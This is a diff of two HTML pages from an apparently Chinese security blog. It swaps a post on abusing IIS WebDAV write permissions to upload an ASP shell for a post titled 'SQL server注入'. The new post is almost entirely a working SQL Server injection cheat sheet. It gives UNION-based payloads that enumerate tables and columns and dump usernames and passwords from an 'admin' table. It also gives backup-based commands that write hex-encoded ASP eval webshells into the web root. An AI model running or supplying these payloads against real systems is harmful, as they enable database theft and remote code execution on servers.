@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="IIS," />
+  <meta name="keywords" content="SQL注入," />
 
 
 
@@ -86,37 +86,25 @@
 
 
 
-<meta name="description" content="IIS写权限漏洞，说白了就是菜鸟管理员对IIS的错误配置问题：  
+<meta name="description" content="sql注入攻击本质：把用户输入的数据当代码使用攻击请求向量：分为GET POST Cookie数据类型：整型，字符型，搜索型显示数据方法：
 
-WEB服务器扩展里设置WebDAV为允许；  
-网站权限配置开启了写入权限与脚本资源访问权限。">
+显错注入
+盲注（布尔注入，延时，报错，联合查询，堆查询，DNS查询）">
 <meta property="og:type" content="article">
-<meta property="og:title" content="IIS写权限漏洞">
-<meta property="og:url" content="http://yoursite.com/2016/09/19/IIS写权限/index.html">
+<meta property="og:title" content="SQL server注入">
+<meta property="og:url" content="http://yoursite.com/2016/10/09/SQL-server注入/index.html">
 <meta property="og:site_name" content="●(六儿)●">
-<meta property="og:description" content="IIS写权限漏洞，说白了就是菜鸟管理员对IIS的错误配置问题：  
+<meta property="og:description" content="sql注入攻击本质：把用户输入的数据当代码使用攻击请求向量：分为GET POST Cookie数据类型：整型，字符型，搜索型显示数据方法：
 
-WEB服务器扩展里设置WebDAV为允许；  
-网站权限配置开启了写入权限与脚本资源访问权限。">
-<meta property="og:image" content="http://i.imgur.com/dXNHb7g.png">
-<meta property="og:image" content="http://i.imgur.com/90B933M.png">
-<meta property="og:image" content="http://i.imgur.com/Qh4uVLK.png">
-<meta property="og:image" content="http://i.imgur.com/8vuWmRI.png">
-<meta property="og:image" content="http://i.imgur.com/T1V0CU0.png">
-<meta property="og:image" content="http://i.imgur.com/beIwEEv.png">
-<meta property="og:image" content="http://i.imgur.com/f0t8J5i.png">
-<meta property="og:image" content="http://i.imgur.com/9r8IOzs.png">
-<meta property="og:image" content="http://i.imgur.com/cCDvQW8.png">
-<meta property="og:image" content="http://i.imgur.com/fu790mL.png">
-<meta property="og:image" content="http://i.imgur.com/uLwjk2W.png">
-<meta property="og:updated_time" content="2016-09-21T02:03:16.642Z">
+显错注入
+盲注（布尔注入，延时，报错，联合查询，堆查询，DNS查询）">
+<meta property="og:updated_time" content="2016-10-09T01:42:37.278Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="IIS写权限漏洞">
-<meta name="twitter:description" content="IIS写权限漏洞，说白了就是菜鸟管理员对IIS的错误配置问题：  
+<meta name="twitter:title" content="SQL server注入">
+<meta name="twitter:description" content="sql注入攻击本质：把用户输入的数据当代码使用攻击请求向量：分为GET POST Cookie数据类型：整型，字符型，搜索型显示数据方法：
 
-WEB服务器扩展里设置WebDAV为允许；  
-网站权限配置开启了写入权限与脚本资源访问权限。">
-<meta name="twitter:image" content="http://i.imgur.com/dXNHb7g.png">
+显错注入
+盲注（布尔注入，延时，报错，联合查询，堆查询，DNS查询）">
 
 
 
@@ -137,9 +125,9 @@ WEB服务器扩展里设置WebDAV为允许；
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2016/09/19/IIS写权限/"/>
+  <link rel="canonical" href="http://yoursite.com/2016/10/09/SQL-server注入/"/>
 
-  <title> IIS写权限漏洞 | ●(六儿)● </title>
+  <title> SQL server注入 | ●(六儿)● </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -330,7 +318,7 @@ WEB服务器扩展里设置WebDAV为允许；
             
             
               
-                IIS写权限漏洞
+                SQL server注入
               
             
           </h1>
@@ -342,8 +330,8 @@ WEB服务器扩展里设置WebDAV为允许；
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-09-19T08:48:19+08:00" content="2016-09-19">
-              2016-09-19
+            <time itemprop="dateCreated" datetime="2016-10-09T09:10:57+08:00" content="2016-10-09">
+              2016-10-09
             </time>
           </span>
 
@@ -356,8 +344,8 @@ WEB服务器扩展里设置WebDAV为允许；
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/漏洞/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞</span>
+                  <a href="/categories/渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透</span>
                   </a>
                 </span>
 
@@ -372,8 +360,8 @@ WEB服务器扩展里设置WebDAV为允许；
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/09/19/IIS写权限/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/19/IIS写权限/" itemprop="commentsCount"></span>
+                <a href="/2016/10/09/SQL-server注入/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/10/09/SQL-server注入/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -383,7 +371,7 @@ WEB服务器扩展里设置WebDAV为允许；
 
           
           
-             <span id="/2016/09/19/IIS写权限/" class="leancloud_visitors" data-flag-title="IIS写权限漏洞">
+             <span id="/2016/10/09/SQL-server注入/" class="leancloud_visitors" data-flag-title="SQL server注入">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -405,38 +393,27 @@ WEB服务器扩展里设置WebDAV为允许；
       
 
       
-        <p>IIS写权限漏洞，说白了就是菜鸟管理员对IIS的错误配置问题：  </p>
+        <p>sql注入攻击本质：把用户输入的数据当代码使用<br>攻击请求向量：分为GET POST Cookie<br>数据类型：整型，字符型，搜索型<br>显示数据方法：</p>
 <ul>
-<li>WEB服务器扩展里设置WebDAV为允许；  </li>
-<li>网站权限配置开启了写入权限与脚本资源访问权限。 <a id="more"></a>
-</li>
+<li>显错注入</li>
+<li>盲注（布尔注入，延时，报错，联合查询，堆查询，DNS查询）</li>
 </ul>
-<h3 id="先在Windows-server2003中搭建好实验环境。"><a href="#先在Windows-server2003中搭建好实验环境。" class="headerlink" title="先在Windows server2003中搭建好实验环境。"></a>先在Windows server2003中搭建好实验环境。</h3><ul>
-<li>WEB服务器扩展里设置WebDAV和Active Server Pages为允许；  </li>
-<li>网站主目录权限配置开启写入权限与脚本资源访问权限；  </li>
-<li>TCP端口为80；  </li>
-<li>主目录属性-安全中来宾用户的权限为完全控制。</li>
-</ul>
-<h3 id="使用桂林老兵的IISwriter"><a href="#使用桂林老兵的IISwriter" class="headerlink" title="使用桂林老兵的IISwriter"></a>使用桂林老兵的IISwriter</h3><p><img src="http://i.imgur.com/dXNHb7g.png" alt=""><br>然后提交数据包，会在服务端生成一个test.txt的文件  </p>
-<p><img src="http://i.imgur.com/90B933M.png" alt=""><br>但是这个问津不能被IIS解析，所以要用move，主要目的是为了将txt的文件修改为asp，从而变成可执行的脚本文件。  </p>
-<p><img src="http://i.imgur.com/Qh4uVLK.png" alt=""><br>看一下，确实存在shell.asp文件  </p>
-<p><img src="http://i.imgur.com/8vuWmRI.png" alt="">  </p>
-<h3 id="用菜刀链接"><a href="#用菜刀链接" class="headerlink" title="用菜刀链接"></a>用菜刀链接</h3><p><img src="http://i.imgur.com/T1V0CU0.png" alt=""></p>
-<h3 id="菜刀成功链接"><a href="#菜刀成功链接" class="headerlink" title="菜刀成功链接"></a>菜刀成功链接</h3><p><img src="http://i.imgur.com/beIwEEv.png" alt=""><br>成功拿到shel！</p>
-<h3 id="错误集锦"><a href="#错误集锦" class="headerlink" title="错误集锦"></a>错误集锦</h3><ul>
-<li>无法上传txt文件</li>
-</ul>
-<p><img src="http://i.imgur.com/f0t8J5i.png" alt=""><br>原因：没有写入权限</p>
-<p><img src="http://i.imgur.com/9r8IOzs.png" alt=""><br>原因：TCP端口不是80</p>
-<p><img src="http://i.imgur.com/cCDvQW8.png" alt=""><br>原因：WEB服务器扩展里没有设置WebDAV为允许</p>
-<ul>
-<li>无法更改txt文件为asp文件</li>
-</ul>
-<p><img src="http://i.imgur.com/fu790mL.png" alt=""></p>
-<ul>
-<li>菜刀出现故障</li>
-</ul>
-<p><img src="http://i.imgur.com/uLwjk2W.png" alt=""><br>原因：WEB服务器扩展里没有设置Active Server Pages为允许</p>
+<a id="more"></a>
+<h4 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h4><p>interger：<br>id=1-0 正常<br>id=1-1  出错<br>string：<br>and ‘a’=’a’ 正常<br>and ‘a’=’b’ 出错</p>
+<h4 id="数据库判断"><a href="#数据库判断" class="headerlink" title="数据库判断"></a>数据库判断</h4><p>and exists(select @@version)–</p>
+<h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><p>Order by 5 –     </p>
+<h4 id="判断字段数据类型"><a href="#判断字段数据类型" class="headerlink" title="判断字段数据类型"></a>判断字段数据类型</h4><p>union all select NULL,NULL,NULL,NULL,NULL–<br>union all select NULL,NULL,’ test’ ,NULL,NULL–<br>正常说明第3字段为字符型可以显示SQL注入数据。</p>
+<h4 id="显示数据库版本"><a href="#显示数据库版本" class="headerlink" title="显示数据库版本"></a>显示数据库版本</h4><p>and 1=2 union all select NULL,NULL,@@version,NULL,NULL–</p>
+<h4 id="显示当前库名"><a href="#显示当前库名" class="headerlink" title="显示当前库名"></a>显示当前库名</h4><p>and 1=2 union all select NULL,db_name(),NULL,NULL,NULL from sysobjects–</p>
+<h4 id="显示指定库的表名"><a href="#显示指定库的表名" class="headerlink" title="显示指定库的表名"></a>显示指定库的表名</h4><p>and 1=2 union all select NULL,(select top 1 name from 库名..sysobjects where xtype=’u’ and name not in(select top 0 name from 库名..sysobjects where xtype=’u’)),NULL,NULL,NULL from sysobjects–</p>
+<h4 id="显示当前库的表名"><a href="#显示当前库的表名" class="headerlink" title="显示当前库的表名"></a>显示当前库的表名</h4><p>and 1=2 union all select NULL,(select top 1 name from sysobjects where xtype=’u’ and name not in(select top 0 name from sysobjects where xtype=’u’)),NULL,NULL,NULL from sysobjects–    </p>
+<p>and 1=2 union all select NULL,(select top 1 name from sysobjects where xtype=’u’ and name not in(select top 1 name from sysobjects where xtype=’u’)),NULL,NULL,NULL from sysobjects–<br>//查询表名(从0开始增加第二个top N的数字就可以遍历当前数据库表名了。</p>
+<h4 id="显示字段名"><a href="#显示字段名" class="headerlink" title="显示字段名"></a>显示字段名</h4><p>and 1=2 union all select NULL,(select top 1 name from syscolumns where id in (select id from sysobjects where name=’admin’) and name not in (select top 1 name from syscolumns where id in (select id from sysobjects where name=’admin’))),NULL,NULL,NULL from sysobjects–    </p>
+<p>and 1=2 union all select NULL,(select top 1 name from syscolumns where id in (select id from sysobjects where name=’admin’) and name not in (select top 2 name from syscolumns where id in (select id from sysobjects where name=’admin’))),NULL,NULL,NULL from sysobjects–<br>从0开始增加第二个top N的数字就可以遍历admin表的字段名了</p>
+<h4 id="显示字段值"><a href="#显示字段值" class="headerlink" title="显示字段值"></a>显示字段值</h4><p>and 1=2 union all select id,username,password,NULL,NULL from admin–</p>
+<h4 id="webshell写入"><a href="#webshell写入" class="headerlink" title="webshell写入"></a>webshell写入</h4><p>数据库与 Web 分离判断：<br>网站主机名:select host_name(); 数据库主机名:select @@servername;<br>如果未分离可以写入 shell</p>
+<h5 id="日志备份"><a href="#日志备份" class="headerlink" title="日志备份"></a>日志备份</h5><p>;DROP TABLE cmd–<br>;ALTER DATABASE 库名 SET RECOVERY FULL–<br>;CREATE TABLE cmd (a IMAGE)–<br>;BACKUP DATABASE 库名 TO DISK = ‘c:\progra~1\1.bak’ WITH INIT–<br>;INSERT INTO cmd (a) VALUES(0x3c256576616c207265717565737428224d482229253e)–<br>;BACKUP DATABASE 库名 TO DISK = ‘C:\Inetpub\wwwroot\shell.asp’–<br>;DROP TABLE cmd–</p>
+<h5 id="差异备份"><a href="#差异备份" class="headerlink" title="差异备份"></a>差异备份</h5><p>;drop table cmd–<br>;backup database testdb to disk =’c:\progra~1\sq.bak’–<br>;create table cmd(a image)–<br>;insert into cmd(a) values(0x3c256576616c20726571756573742822746f6d2229253e)–<br>;backup database testdb to disk=’C:\Inetpub\wwwroot\sq.asp’ with differential,format–<br>;drop table cmd–</p>
 
       
     </div>
@@ -464,7 +441,7 @@ WEB服务器扩展里设置WebDAV为允许；
       
         <div class="post-tags">
           
-            <a href="/tags/IIS/" rel="tag">#IIS</a>
+            <a href="/tags/SQL注入/" rel="tag">#SQL注入</a>
           
         </div>
       
@@ -473,17 +450,13 @@ WEB服务器扩展里设置WebDAV为允许；
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/09/10/php复制整个文件目录的实现/" rel="next" title="php复制整个文件目录的实现">
-                <i class="fa fa-chevron-left"></i> php复制整个文件目录的实现
+              <a href="/2016/09/27/webinspect扫描器/" rel="next" title="webinspect扫描器">
+                <i class="fa fa-chevron-left"></i> webinspect扫描器
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/09/22/WEB踩点/" rel="prev" title="WEB踩点">
-                WEB踩点 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -513,8 +486,8 @@ WEB服务器扩展里设置WebDAV为允许；
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/09/19/IIS写权限/"
-           data-title="IIS写权限漏洞" data-url="http://yoursite.com/2016/09/19/IIS写权限/">
+      <div class="ds-thread" data-thread-key="2016/10/09/SQL-server注入/"
+           data-title="SQL server注入" data-url="http://yoursite.com/2016/10/09/SQL-server注入/">
       </div>
     
   </div>
@@ -659,7 +632,7 @@ WEB服务器扩展里设置WebDAV为允许；
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#先在Windows-server2003中搭建好实验环境。"><span class="nav-number">1.</span> <span class="nav-text">先在Windows server2003中搭建好实验环境。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用桂林老兵的IISwriter"><span class="nav-number">2.</span> <span class="nav-text">使用桂林老兵的IISwriter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用菜刀链接"><span class="nav-number">3.</span> <span class="nav-text">用菜刀链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#菜刀成功链接"><span class="nav-number">4.</span> <span class="nav-text">菜刀成功链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#错误集锦"><span class="nav-number">5.</span> <span class="nav-text">错误集锦</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#注入点判断"><span class="nav-number">1.</span> <span class="nav-text">注入点判断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库判断"><span class="nav-number">2.</span> <span class="nav-text">数据库判断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#判断字段数"><span class="nav-number">3.</span> <span class="nav-text">判断字段数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#判断字段数据类型"><span class="nav-number">4.</span> <span class="nav-text">判断字段数据类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#显示数据库版本"><span class="nav-number">5.</span> <span class="nav-text">显示数据库版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#显示当前库名"><span class="nav-number">6.</span> <span class="nav-text">显示当前库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#显示指定库的表名"><span class="nav-number">7.</span> <span class="nav-text">显示指定库的表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#显示当前库的表名"><span class="nav-number">8.</span> <span class="nav-text">显示当前库的表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#显示字段名"><span class="nav-number">9.</span> <span class="nav-text">显示字段名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#显示字段值"><span class="nav-number">10.</span> <span class="nav-text">显示字段值</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#webshell写入"><span class="nav-number">11.</span> <span class="nav-text">webshell写入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#日志备份"><span class="nav-number">11.1.</span> <span class="nav-text">日志备份</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#差异备份"><span class="nav-number">11.2.</span> <span class="nav-text">差异备份</span></a></li></ol></li></ol></div>
             
           </div>
         </section>
